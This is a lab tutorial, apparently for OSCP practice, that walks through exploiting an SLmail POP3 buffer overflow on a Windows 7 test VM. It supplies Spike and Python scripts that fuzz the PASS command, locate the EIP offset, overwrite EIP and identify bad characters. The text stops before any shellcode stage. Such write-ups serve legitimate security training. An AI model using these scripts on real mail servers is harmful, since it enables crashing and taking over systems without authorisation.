# SLmail-Bof
### Introduction

The below is a list to follow in order to successfully exploit the buffer overflow.

-   Part 1: Find the vulnerable part of the program
    
-   Part 2: Fuzzing
    
-   Part 3: Finding the Offset
    
-   Part 4: Overwriting the EIP
    
-   Part 5: Finding Bad Characters
    
-   Part 6: Finding the Right Module
    
-   Part 7: Generating Shellcode and Gaining Root
    
_Note: For the OSCP exam start from "Fuzzing" step._

Tools Needed:

1.  [VMWare Player](https://my.vmware.com/en/web/vmware/downloads/details?downloadGroup=PLAYER-1610&productId=1039&rPId=55792) to create your Victim Machine
    
2.  Victim Machine: [Windows 7x86](https://softlay.net/operating-system/windows-7-ultimate-iso-download.html)
    
3.  Vulnerable Software: [SLmail](https://slmail.software.informer.com/download/#downloading) (download and install in the Victim Machine)
    
4.  Attacker Machine: Kali Linux
    
5.  Debugger: [Immunity Debugger](https://www.immunityinc.com/products/debugger/) (download and install in the Victim Machine)
    
6.  [Mona Modules](https://github.com/corelan/mona) (needs to be placed inside the Immunity Debugger's folder under the subfolder "PyCommands")
    

### Part 1: Find the Vulnerable Part of the Program - Spiking

Turn off the Windows Firewall(Control Panel -> Systems and Security -> Windows Firewall -> Advanced Settings -> Change to off(private and public tab also) and install the SLmail application(default settings on all options). When the Windows Machine restarts Go to Start -> All Programs -> SL Products -> SLmail Configuration -> Right Click -> Run As Administrator. Choose the tab "Control" from the SLmail and leave it open. After that run the Immunity Debugger As Administrator and Go to File -> Attach and select the SLmail Process.

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MP0bsWxOSmk4zVj23g7%2F-MP0cDsnWHGVtAXEH69y%2FUntitled.png?alt=media&token=bc0af58a-f873-47f7-b437-4af09daee14a)

#### SLmail Application

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MOovYCBMo-KWiRhRvEc%2F-MOowRZgJ5ONEU0xVi13%2FScreenshot%20from%202020-12-18%2009-30-23.png?alt=media&token=f59d2eae-5029-427b-baad-f489c56488b4)

#####  SLmail Process in Immunity Debugger

When you "Attach" the program in the Immunity Debugger at the bottom right corner it says "Paused" so press the "Play" button in order for the program to start.

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MP0bsWxOSmk4zVj23g7%2F-MP0dRi4rp-sHPIS5kg4%2Fimage.png?alt=media&token=ff21cee2-293c-4a92-9e35-489f07bb2e78)

The paused program in Immunity Debugger

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MP0bsWxOSmk4zVj23g7%2F-MP0eHMV16HRGTeCML55%2Fimage.png?alt=media&token=123ac7b6-5db0-4f38-b29d-31752666828d)

Press the "Play" button to run the program

Connect with netcat to the SLmail application from your Kali box. By default SLmail application runs on port 110.

Run "ipconfig" on your Windows Machine's cmd and replace the $ip

```bash
nc -nv $ip 110
```

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MQIW4xIkrOaIPeoc_Iu%2F-MQIWIbcRZ72dv5xM4KL%2Fimage.png?alt=media&token=a11accbf-4b08-476d-a7da-e7c8a1ad7467)

Now we need to find the vulnerable part of the program. To do this we will use a spiking. The SLmail program requires two user inputs to connect to it. The "USER" username and "PASS" password. Both of these parameters need to be tested with different size of inputs so to find if any of the inputs overflow the buffer. A way to do this, is with the tool `generic_send_tcp` (already in your kali machine). As shown in the image below you will need the host's _IP_ , the _PORT_ which the SLmail is running on and a spike script. The SKIPVAR and SKIPSTR will remain 0. With spiking we will send all the different kinds of characters (2000,5000, 3000 at a time)randomly in order to try and break the program.

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MPDaqum_eRffQZZ0EIm%2F-MPDmmuxTQ-DhHZgroIy%2Fimage.png?alt=media&token=595306ed-4579-46e9-87dc-8df9d6f36016)

Create a script like the one below and save it as spike.spk. This script will only test the "PASS" parameter.

```bash
s_readline(); # Reads the first line coming from the server
s_string("USER test"); # Enter the string "USER test" 
s_string("\r\n"); # Return+new line
s_readline(); # Read the response from the sender
s_string("PASS "); # Enter the string PASS
s_string_variable("0"); # Send a variable at it. In all different forms and Iteration 
```

At this point **Immunity Debugger** and **SLmail** are running.We should start **Wireshark**. Wireshark will help us identify the size of the script that crashed the program. All three programs should be running and now we should run the `generic_send_tcp.`

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MPUU7kO6FO7s7COsbzC%2F-MPUV-3zylmAWIw5xB1P%2Fimage.png?alt=media&token=a216bf44-a69a-4c57-863b-79fd4963ab5f)


While the tool is running I am checking the Immunity Debugger. When the Immunity Debugger is Paused (like the image below) down observe the left corner where the "Access Violation" is shown. This means we hit a violation. Now, we should stop the script and check the registers to for more information. The EBP (base register) and the EIP have been overwritten with the value 25252525. The number 25 represents the character "%" in ASCII. So, these two registers have been overwritten with 4 bytes, or 4 "%" characters.

_What is EIP?_

EIP is the instruction pointer that controls the execution flow of the program - it holds the memory address of the next instruction to be executed. So, we need to overwrite the EIP with a new memory address that points to malicious code. In order to do this we need to find out exactly at how many characters the program crushes.

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MPDuJAu2n4w1onY_MWy%2F-MPDvsXIFC5fMzwMu8xO%2FWindows%207-2020-12-23-08-39-49.png?alt=media&token=a8ac28f3-69a2-4f45-8b8a-3a65450654f0)

‌Now lets find the specific package in Wireshark. The package size is 20kb. Which is equivalent with 20480 bytes.

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MPDyN5blltPpiDbSlv0%2F-MPDyivwq3F65H4c39X1%2FWindows%207-2020-12-23-11-42-31.png?alt=media&token=24fb04fd-7e61-4fa5-98c2-ebd6f88259e6)

‌Next step is to create an exploit script with the size of the buffer of 20480 bytes.

### Part 2: Fuzzing

Fuzzing is similar to spiking. We will be sending a large amount of characters at a specific input/command and try to break it. Spiking mostly is being used for multiple commands and trying to find which one is vulnerable. Now we know that the PASS command is vulnerable so we will target that command specifically. Prepare the environment again and Run As Administrator the Immunity Debugger and the SLmail (All Programs -> SL Products -> SLmail Configuration -> Right Click -> Run As Administrator). Attached he process SLmail to the Immunity Debugger (File->Attach->SLmail) and ensure that you press the "Play" button in the Immunity Debugger. The below script is written in python and it will be used for the fuzzing:

```python 
#!/usr/bin/python

import sys, socket

buffer = "A" * 100

while True:

 try:

 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('192.168.10.178', 110))
 data = s.recv(1024)
 s.send('USER username ' + '\r\n')
 data = s.recv(1024)
 print "Fuzzing PASS with %s bytes" % str(len(buffer))
 s.send(('PASS ' + buffer + '\r\n'))
 data = s.recv(1024)
 buffer = buffer + "A"*400
 s.close()

 except: 

 print "\nFuzzing crashed at %s bytes" % str(len(buffer))

 sys.exit()
```

Run the script and when the Immunity Debugger crashes press CTRL+C to terminate the script.

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MPitP8AeWXAWxB4qzA0%2F-MPjH9B7N-ljkI8MOWOO%2FWindows%207-2020-12-29-18-15-21.png?alt=media&token=72f02bbe-2d8d-4e37-8b4f-7b97b4281d03)

Immunity Debugger crashed

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MPitP8AeWXAWxB4qzA0%2F-MPjHS8DdxGJcwp60cGH%2Fimage.png?alt=media&token=e188c2fa-25e0-49c9-b03a-10d68b633af8)

Script shows that the program crashed when we send 2900 bytes

SLMail has a buffer overflow vulnerability when a PASS command with a password containing about 2700 bytes is sent to it.

### Part 3: Finding the Offset

Getting control of the EIP register is a crucial step of exploit development.If we control the EIP we can control the execution flow of the program.We need to locate those 4 "A" that overwrite our EIP register in the buffer. We can do this by sending a unique string of 2900 bytes, identify the 4 bytes that overwrite EIP, and then locate those four bytes in our unique buffer. We can generate a unique string with the tool msf-pattern\_create and locate those 4 bytes in our buffer using the tool msf-pattern\_offset.rb

`msf-pattern_create -l 2700` \-l: length of the string. Here, the length will be 2900 same as the crash's length. This will be send to the Immunity Debugger.

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MPjJ6sAuABNtRO8Brop%2F-MPjLbO2FGojZyIMkwrP%2Fimage.png?alt=media&token=a2577032-0802-4b26-8412-df50553abff5)

In order to send the above string we need to modify the script as below:

```python
#!/usr/bin/python

import sys, socket

offset="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds"

try:

 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('192.168.10.178',110))
 data = s.recv(1024)
 s.send('USER username' +'\r\n')
 data = s.recv(1024)
 s.send('PASS ' + offset + '\r\n')

except:

 print "Error Connecting to server"
 sys.exit()
```

When we execute this script the EIP will be overwritten with 4 hex bytes. These bytes will help us determine the offset by using the `msf-pattern_offset`.

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MPjJ6sAuABNtRO8Brop%2F-MPjP4Yo5wJ5lDBlf9B9%2FWindows%207-2020-12-29-18-49-56.png?alt=media&token=7a573299-817e-468f-91f3-2ac7db24b0d5)




The EIP register has been overwritten with the hex bytes 39 69 44 38. We can now use the tool msf-pattern\_offset to discover the offset of these specific 4 bytes in our unique byte string.

```bash
msf-pattern_offset -l 2900 -q 39694438
```
-l:lenght
-q: EIP overwritten with these 4bytes found on the previous step

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MPjJ6sAuABNtRO8Brop%2F-MPjPhX6PkyWa02sK_gb%2Fimage.png?alt=media&token=e1b78adc-6d2d-482d-9479-2586f58f2ba9)

##### Found the offset
The script reports these 4 bytes are located at offset 2606 of the 2900 bytes.Meaning that somewhere inside these 2900 bytes it found the pattern '39694438' and relayed back to it. This means that at 2606 bytes the EIP can be controlled.

### Part 4: Overwriting the EIP

The offset is at 2606 bytes which means that there are 2606 bytes right before you get to the EIP and then the EIP itself is 4 bytes long. You need to overwrite those 4 bytes. Restart Immunity Debugger and SLmail (always As an Administrator) and edit the the script to look like the below:

```python 
#!/usr/bin/python

import sys, socket

shellcode = "A" * 2606 + "B" * 4

try:

 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('192.168.10.178',110))
 data = s.recv(1024)
 s.send('USER username' +'\r\n')
 data = s.recv(1024)
 s.send('PASS ' + shellcode + '\r\n')

except:

 print "Error Connecting to server"
```

So I sent 2606 "A" because that's where the EIP starts. The 4 "B"s are used to ensure that we overwrite the 4 bytes of EIP. The EIP will be overwritten with the value "42424242" which is the hexadecimal representation of "BBBB".

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MPmEWTpvSKyj2No_SyM%2F-MPmkTiMrN4ForMNgwpY%2FWindows%207-2020-12-30-10-26-42.png?alt=media&token=47e099b3-6f41-4130-88cf-ca773161f559)

As shown in the image above the EIP has been overwritten with the 4 "B" which means we are able to control the EIP(execution flow of the program) by controlling those 4 bytes.But where do we redirect the execution flow now that we can control EIP? Part of our buffer can contain user introduce code or shellcode that we would like to be executed by the SLmail application. Once, the shellcode is in memory we will try to redirect the execution flow of the SLmail application to this shellcode.Next step is to find bad characters. Bad characters cannot be included in the payload.


### Part 5: Finding Bad Characters

There may be certain characters that are considered “bad” and should not be used in the buffer, return address, or shellcode. A way to do this is to send all possible characters from (\x00 to \xff)and see how these characters are dealt with by the application, after the crash occurs. If we use a bad character to our shellcode it might crash.

Print all characters using this: `for i in {0..255}; do printf "\\x%02x" $i;done`

```bash 
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```
![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MPmwqv5xVqScBxNaB1d%2F-MPmzK8Am7ZOO64QXk-x%2Fimage.png?alt=media&token=28628625-2be2-4692-a8bd-cfa5ddd63cce)

The null byte "\x00" is considered a bad character so I will remove it from the exploit.Change your script as below:

```python 
#!/usr/bin/python

import sys, socket

badchars= ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A" * 2606 + "B" * 4 + badchars

try:

 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('192.168.10.91',110))
 data = s.recv(1024)
 s.send('USER username' +'\r\n')
 data = s.recv(1024)
 s.send('PASS ' + shellcode + '\r\n')

except:

 print "Error Connecting to server"
```

Send this to the program while Immunity Debugger is running and when it crash we will look for the bad chars. To do that click on the ESP register -> right click -> Follow in Dump. At the bottom left corner of the Immunity Debugger you will see the characters we have send. Remember we have sent all the characters. Checking the dump we can see that the value 29 is after the value 09. It should be the value 0A. IT means that 0A is bad character and should be remove from our shellcode.

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MPn2pE_hRJOwczuhpl1%2F-MPn4YHRsNYBrh97uK_N%2Fimage.png?alt=media&token=6b884850-cb99-43ad-bd59-eaa091398ed8)

Bad Character: 0A

Now we will repeat the process without 0A to find if there is any other bad character. Remove x0a from the script and run it again. (Restart Immunity Debugger and SLmail)

```python 
#!/usr/bin/python

import sys, socket

badchars= ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A" * 2606 + "B" * 4 + badchars

try:

 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('192.168.10.178',110))
 data = s.recv(1024)
 s.send('USER username' +'\r\n')
 data = s.recv(1024)
 s.send('PASS ' + shellcode + '\r\n')

except:

 print "Error Connecting to server"

```

Run the script without the 0A character and in the Immunity Debugger select the ESP register -> Follow in Dump and check the window in the bottom left corner of the Immunity Debugger. Observe inside the hex dump and you will identify that the character 0D is missing.

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MPn2pE_hRJOwczuhpl1%2F-MPn6GgnaTI2tyNf5aLL%2Fimage.png?alt=media&token=5f983c5e-54e5-464a-9c85-ba75ba14038c)

So, the character 0D is considered a bad character. You need to remove it also from the script and run it again to idenitfy any remaining bad characters.


```python 
#!/usr/bin/python

import sys, socket

badchars=  ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode= "A" * 2606 + "B" * 4 + badchars

try:

 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('192.168.10.178',110))
 data = s.recv(1024)
 s.send('USER username' +'\r\n')
 data = s.recv(1024)
 s.send('PASS ' + shellcode + '\r\n')

except:

 print "Error Connecting to server"
```
![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MPn2pE_hRJOwczuhpl1%2F-MPn8Os0MPQs5o-ErIPc%2Fimage.png?alt=media&token=79b7ccea-d7a1-4733-8ecf-8842243b7d99)

It seems like all the characters are correct and in place. To conclude,our shellcode should not include the characters 00,0A,0D or the contents of our payload might get truncated and will not give us the desired results.

### Part 6: Finding the Right Module

The next task is to find a way to redirect the execution flow to the shellcode located at the memory address that the ESP register (contains the address of the next instruction or function call)is pointing to, at crash time.As you noticed from the past few debugger restarts, the value of ESP changes, from crash to crash. Therefore, hardcoding a specific stack address would not provide a reliable way of getting to our buffer. The goal here is to find an accessible, reliable address in memory (that does not have memory protections:no DEP , ASLR)that contains an instruction such as JMP ESP, that we are able to jump to it, and in turn end up at the address pointed to, by the ESP register, at the time of the jump. This would provide a reliable, indirect way to reach the memory indicated by the ESP register, regardless of its absolute value. To find such an address we will use _mona.py_

